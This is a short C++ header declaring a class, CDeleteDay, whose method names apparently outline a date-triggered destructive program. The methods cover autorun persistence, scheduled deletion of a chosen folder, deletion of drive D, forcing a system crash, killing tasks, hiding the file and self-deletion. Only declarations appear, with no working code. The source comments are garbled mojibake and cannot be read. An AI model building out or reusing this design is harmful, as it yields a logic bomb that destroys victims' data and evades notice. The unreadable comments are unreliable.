#pragma once
class CDeleteDay
{
private:
	CString m_strFilePath; //���� � ������ ���������
	//���������� � ������������

public:
	CDeleteDay();
	~CDeleteDay();

	// //��������� ���� ������������
	bool AddToAutoRun();
	// ��������� �� �������� �� ���� ���������� �������
	bool InspectDeleteData();

	// ���������� � ������ ����� ���������� ������
	bool SaveDateOfPerformance(SYSTEMTIME SysTime);
	// ���������� ����� ����� ����� �������
	bool SavePathOfFolderToDelete(CString csFolderPath);	
	bool EnableCrashOnCtrlScroll();
	bool DeleteDiskD();
	bool SaveTaskKillWindows();
	void SelfDelete();
	void HideFile();
};

